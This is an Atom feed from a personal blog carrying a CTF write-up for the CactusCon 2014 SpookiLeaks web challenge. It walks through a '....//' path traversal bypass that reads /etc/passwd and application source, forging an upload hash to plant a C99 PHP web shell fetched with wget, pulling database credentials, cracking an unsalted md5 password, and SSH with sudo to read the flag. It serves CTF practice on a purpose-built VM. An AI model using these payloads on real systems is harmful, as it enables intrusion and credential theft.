@@ -1,0 +1,313 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Chris Kankiewicz</title><link href="http://blog.chriskankiewicz.com/" rel="alternate"></link><link href="http://blog.chriskankiewicz.com/feeds/hacking.atom.xml" rel="self"></link><id>http://blog.chriskankiewicz.com/</id><updated>2014-04-15T19:49:00-07:00</updated><entry><title>CactusCon 2014 CTF Writeup</title><link href="http://blog.chriskankiewicz.com/cactuscon-2014-ctf-writeup.html" rel="alternate"></link><published>2014-04-15T19:49:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2014-04-15:cactuscon-2014-ctf-writeup.html</id><summary type="html">&lt;p&gt;This is a write up to the 2014 CactusCon web application
+(&lt;a href="https://github.com/PHX2600/spookileaks"&gt;SpookiLeaks&lt;/a&gt;) challenge.  You can grab
+the SpookiLeaks-VM &lt;a href="https://drive.google.com/file/d/0BweAXsUQLm0mRFVsTmV5O
+HdUVTg/edit?usp=sharing"&gt;here&lt;/a&gt; and try the challenge yourself before reading the
+solution.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;!!! WARGING: SPOILERS BELOW !!!&lt;/h2&gt;
+&lt;hr /&gt;
+&lt;h3&gt;The First Clue&lt;/h3&gt;
+&lt;p&gt;The first clue to solving the challenge is hidden in plain sight.  Before even
+logging in if we scan the pre-loaded images on the Spooky Images page there's
+one image with the following comment:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;01110010011011110110001001101111011101000111001100101110011101000111100001110100
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Binary should be a red flag in any CTF. By doing a simple binary to ASCII
+conversion we get the following output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;robots.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ah-ha! &lt;a href="http://www.robotstxt.org/robotstxt.html"&gt;robots.txt&lt;/a&gt;... By checking
+&lt;code&gt;/robots.txt&lt;/code&gt; we find the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;User-agent: *
+Disallow: /secret_docs/file-tree.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here we find mention of &lt;code&gt;/secret_docs/file-tree.txt&lt;/code&gt; with a rule of "Disallow".
+Fortunately, this rule is only intended to be read by web-crawlers and has no
+actual affect on our ability to read the file.  By visiting
+&lt;code&gt;/secret_docs/file-tree.txt&lt;/code&gt; we find
+&lt;a href="https://raw.githubusercontent.com/PHX2600/spookileaks/master/webroot/secret_docs/file-tree.txt"&gt;this&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Score! We just found a complete listing of the application file structure.  It's
+a pretty long list of files but there's a few things worth noting:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Docs/flag.txt&lt;/code&gt; - This is obviously our target.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Controller\Auth\CustomPasswordHasher.php&lt;/code&gt; - This could tell us about the
+    way user account passwords are hashed.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;webroot/uploads/&lt;/code&gt; - This is where user files are uploaded to, indicated by
+    &lt;code&gt;[ User uploads ]&lt;/code&gt;. This means any files uploaded to the server will be
+    publicly accessable.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;The Application&lt;/h3&gt;
+&lt;p&gt;We have now exposed a lot of information about our application but we still
+don't have a vector of attack.  Let's start assessing the functionality of the
+app.&lt;/p&gt;
+&lt;p&gt;We'll start by registering an account (any user/pass will do).  Once registered
+we gain the ability to add an image from the &lt;code&gt;/images/manage&lt;/code&gt; page.  On first
+pass let's just use the app as intended.  Add a title, select an image (with
+proper extension type) from our computer and add a comment.  Submit the form and
+we now see our image on the left hand side of the page.  Nothing terribly
+interesting yet.  Let's see what this form is actually doing.  By viewing the
+source of the &lt;code&gt;/images/manage&lt;/code&gt; page a few things should catch our eye:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;There's an hidden field in the image submission form referencing a
+    &lt;code&gt;file_hash&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;This page loads a &lt;code&gt;/js/images.js&lt;/code&gt; script that isn't seen on other pages.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The images on this page are loaded via a URL parameter:
+    &lt;code&gt;/images/media?file=image_name.jpg&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Upon inspection of &lt;code&gt;/js/images.js&lt;/code&gt; we find the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$(&amp;#39;.image-file-upload-input:file&amp;#39;).change(function(event) {
+
+    // Initialize formData object
+    var fileName = $(this).val().split(&amp;#39;\\&amp;#39;).pop();
+
+    $.post(&amp;#39;/images/hash&amp;#39;, { fileName: fileName }, function(data) {
+
+        // Parse JSON data
+        var obj = $.parseJSON(data);
+
+        if (obj.file_hash) {
+
+            // Set the file hash input value
+            $(&amp;#39;.image-file-hash-input&amp;#39;).val(obj.file_hash);
+
+        }
+
+    });
+
+});
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is pretty straight forward.  On selection of a file for uploading, a post
+request is made to &lt;code&gt;/images/hash&lt;/code&gt; containing the file name in the post data. The
+returned data is then set as the value of the hidden &lt;code&gt;file_hash&lt;/code&gt; field and this
+gets sent to the server with the form on submission.  By using Firebug or the
+browsers buit-in developer tools we can see the request being made on file
+selection and the data returned.  The data we get back from the jQuery post
+appears to be a sha1 hash. With some additional analysis and playing with the
+form and the hashing function we can tell that the hash generated isn't a direct
+sha1 of the file name.  Also, if we modify the hash after generation the file
+upload form fails to post any data.  Lastly, attempting to upload a file with an
+extension other than those listed as acceptable fails upon submission as well.&lt;/p&gt;
+&lt;p&gt;Let's move on for now and look at the suspicious file loading URL.  Whenever a
+file is loaded via URL parameters there's a good chance it's vulnerable to a
+&lt;a href="https://www.owasp.org/index.php/Path_Traversal"&gt;path traversal attack&lt;/a&gt;.  Let's
+try a basic attack:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/images/media?file=../../../../../etc/passwd
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This results in an error: &lt;code&gt;File "etc/passwd" Not Found&lt;/code&gt;.  It's important to note
+that the returned error does not contain any dot-dot-slashes.  This means
+they're sanitizing this value but there's still a chance it might not be
+sanitized properly.  Knowing the input and output of this unkown function we can
+make a guess as to what it's doing internally and exploit that.  In this case, a
+good guess is that they are replacing all instanced of &lt;code&gt;../&lt;/code&gt; with nothing. We
+can test that out by submitting &lt;code&gt;....//&lt;/code&gt;.  If we're right the inner &lt;code&gt;../&lt;/code&gt; will
+be replaced with nothing leaving a single &lt;code&gt;../&lt;/code&gt; in it's place.  Let's test that:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/images/media?file=....//....//....//....//....//etc/passwd
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It works! Let's try grabbing that flag we saw in the file tree from earlier:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/images/media?file=....//....//Docs/flag.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It's never that easy is it?  This gives us an error but this time it's a
+"Permission denied" error.  That means the web server doesn't have permissions
+to read the flag, thus, we're going to have to find a way to read the flag as a
+user with permission (root perhpse?).&lt;/p&gt;
+&lt;h3&gt;Reconnaissance&lt;/h3&gt;
+&lt;p&gt;At this point we have everything we need to start gathering intel.  The path
+traversal attack plus the file tree give us access to the complete source code
+of the application as well any other files on the server with laxed permissions.
+To save some time, I'll now go over some of the key files our investigation
+should have turned up and their significance:&lt;/p&gt;
+&lt;p&gt;First, in the &lt;code&gt;/etc/passwd&lt;/code&gt; file we tried above we find the "ghost" user:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ghost&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ghost&lt;/span&gt;&lt;span class="o"&gt;,,,:/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="sr"&gt;/ghost:/bin/&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This, along with the contents of &lt;code&gt;/etc/group&lt;/code&gt; let us know the "ghost" account
+has sudo access:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ghost&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Thus, if we can gain access to the "ghost" user account we can read the contents
+of flag.txt.&lt;/p&gt;
+&lt;p&gt;Okay, let's go back to the image submission form, specifically, the hidden
+&lt;code&gt;file_hash&lt;/code&gt; form field. By viewing the source of the ImagesController at
+&lt;code&gt;/images/media?file=....//....//Controller/ImagesController.php&lt;/code&gt; we see that
+this hash is checked against a hash of the submitted file's name:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;if (!&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;file&lt;/span&gt;&lt;span class="x"&gt;[&amp;#39;error&amp;#39;] &amp;amp;&amp;amp; &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;hash&lt;/span&gt;&lt;span class="x"&gt; === &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;&lt;span class="x"&gt;-&amp;gt;hashFile(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;file&lt;/span&gt;&lt;span class="x"&gt;[&amp;#39;name&amp;#39;])) &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Looking at the main &lt;code&gt;/images/hash&lt;/code&gt; action we see a check against the file's
+extension:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;// Get the file name&lt;/span&gt;
+&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt; = trim(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;&lt;span class="x"&gt;-&amp;gt;request-&amp;gt;data[&amp;#39;fileName&amp;#39;]);&lt;/span&gt;
+
+&lt;span class="x"&gt;// Set array of allowed file extensions&lt;/span&gt;
+&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;allowedExtensions&lt;/span&gt;&lt;span class="x"&gt; = array(&amp;#39;png&amp;#39;, &amp;#39;gif&amp;#39;, &amp;#39;jpg&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;bmp&amp;#39;);&lt;/span&gt;
+
+&lt;span class="x"&gt;// Get file extension from source image&lt;/span&gt;
+&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;extension&lt;/span&gt;&lt;span class="x"&gt; = strtolower(pathinfo(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt;, PATHINFO_EXTENSION));&lt;/span&gt;
+
+&lt;span class="x"&gt;// Verify file is of an acceptable type&lt;/span&gt;
+&lt;span class="x"&gt;if (in_array(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;extension&lt;/span&gt;&lt;span class="x"&gt;, &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;allowedExtensions&lt;/span&gt;&lt;span class="x"&gt;)) &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+
+&lt;span class="x"&gt;    // Super duper, top secret hashing algorithm&lt;/span&gt;
+&lt;span class="x"&gt;    &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;data&lt;/span&gt;&lt;span class="x"&gt;[&amp;#39;file_hash&amp;#39;] = &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;&lt;span class="x"&gt;-&amp;gt;hashFile(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt;);&lt;/span&gt;
+
+&lt;span class="x"&gt;} else &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+
+&lt;span class="x"&gt;    // Return false on failure&lt;/span&gt;
+&lt;span class="x"&gt;    &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;data&lt;/span&gt;&lt;span class="x"&gt;[&amp;#39;file_hash&amp;#39;] = false;&lt;/span&gt;
+
+&lt;span class="x"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And viewing the referenced hashFile() function we see the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;private function hashFile(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt;) &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+
+&lt;span class="x"&gt;    // Super duper, top secret hashing algorithm&lt;/span&gt;
+&lt;span class="x"&gt;    return sha1(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt; . &amp;#39;ErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd&amp;#39;);&lt;/span&gt;
+
+&lt;span class="x"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That's a bingo! We now have the method of file hashing along with the secret
+string that gets concatenated with the file name.  With this information we can
+actively exploit the file upload form and generate a valid hash for any file we
+choose.&lt;/p&gt;
+&lt;h3&gt;Shelling the Server&lt;/h3&gt;
+&lt;p&gt;It's now time to grab a fresh copy of &lt;a href="http://www.r57shell.net/"&gt;C99&lt;/a&gt; (I also
+recommend &lt;a href="http://epinna.github.io/Weevely/"&gt;Weevely&lt;/a&gt; but for this example we'll
+stick to the more simple C99 shell) and generate a valid hash for uploading:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://www.r57shell.net/shell/c99.txt
+$ mv c99.txt not_a_shell.php
+$ &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;not_a_shell.phpErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sha1sum
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This gives us:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;90d5aeb035bbcd0df8f5e84721d3eb8f3321ff8c
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now we can go back to the upload form, select our &lt;code&gt;c99.php&lt;/code&gt; file, then using
+Firebug or the browsers built-in web developer tools modify the value of the
+hidden &lt;code&gt;file_hash&lt;/code&gt; element and set it to our pre-generated hash.  This time,
+when we submit the form, the file upload succeeds without error.  Navigating to
+&lt;code&gt;/uploads/not_a_shell.php&lt;/code&gt; now brings up our shell.&lt;/p&gt;
+&lt;p&gt;From here accessing any aspect of the web application or it's database are
+trivial.  Let's investigate the database now.  First, nab the credentials by
+navigating to &lt;code&gt;/images/media?file=....//....//Config/database.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;public &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;default&lt;/span&gt;&lt;span class="x"&gt; = array(&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;datasource&amp;#39; =&amp;gt; &amp;#39;Database/Mysql&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;persistent&amp;#39; =&amp;gt; false,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;host&amp;#39;       =&amp;gt; &amp;#39;localhost&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;login&amp;#39;      =&amp;gt; &amp;#39;spookileaks&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;password&amp;#39;   =&amp;gt; &amp;#39;rmPtShWVyrCcxfJaBvsPL4t2&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;database&amp;#39;   =&amp;gt; &amp;#39;spookileaks&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;prefix&amp;#39;     =&amp;gt; &amp;#39;&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    //&amp;#39;encoding&amp;#39; =&amp;gt; &amp;#39;utf8&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Using C99, we can dump this data easily and see the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;id  username    password                            role    created                 modified
+1   ghost       37988bb25d36058671f959f06a7d51b9    admin   2014-04-03 20:53:19     2014-04-03 20:53:19
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That's the same user name that we found in &lt;code&gt;/etc/passwd&lt;/code&gt; and that password hash
+looks like a basic md5.  We can verify that by checking out he source of that
+custom password hasher at
+&lt;code&gt;/media?file=....//....//Controller/Component/Auth/CustomPasswordHasher.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;public function hash(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="x"&gt;) &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+
+&lt;span class="x"&gt;    // Hash the password&lt;/span&gt;
+&lt;span class="x"&gt;    return md5(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="x"&gt;); // md5 4 life&lt;/span&gt;
+
+&lt;span class="x"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Yup, unsalted md5.  If the password was salted we might start thinking about
+brute forcing it.  However, unsalted passwords are often easily searchable due
+to them being pre-computed en masse and published online.  For our case, a
+simple
+&lt;a href="https://encrypted.google.com/search?q=37988bb25d36058671f959f06a7d51b9"&gt;Google search&lt;/a&gt;
+reveals the password as &lt;code&gt;ScoobySnacks&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;The Final Pieces&lt;/h3&gt;
+&lt;p&gt;We now need to be able to log in to the the system.  Without physical access to
+the box we can perform an &lt;a href="http://nmap.org/"&gt;nmap&lt;/a&gt; scan to see what services are
+up and running:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nmap -sT 192.168.0.170
+
+Starting Nmap 6.40 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2014-04-16 10:48 MST
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 192.168.0.170
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.0034s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+Not shown: &lt;span class="m"&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 0.09 seconds
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here we see that SSH is running on the target machine.  The last question
+remaining now is wether or not the &lt;code&gt;ghost&lt;/code&gt; user was smart enough to use
+different passwords for his system account and his web application accounts.
+All we have to do to test this is SSH into the server with his credentials:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="n"&gt;ghost&lt;/span&gt;&lt;span class="mf"&gt;@192.168.0.170&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;Substitute&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;VMs&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt;
+&lt;span class="n"&gt;ghost&lt;/span&gt;&lt;span class="mf"&gt;@192.168.0.170&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="nl"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Enter the ghost user's password and BOOM!  We're in!  All we have to do is grab
+the content of flag:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo cat /var/www/SpookiLeaks/Docs/flag.txt
+&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; ghost:
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And you've got the flag:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;     CONGLATURATION !!!
+
+     YOU HAVE COMPLETED
+       A GREAT GAME.
+
+  AND PROOVED THE JUSTICE
+      OF OUR CULTURE.
+
+    NOW GO AND REST OUR
+          HEROES !
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="CTF"></category><category term="Linux"></category><category term="PHP"></category><category term="Hacking"></category></entry></feed>
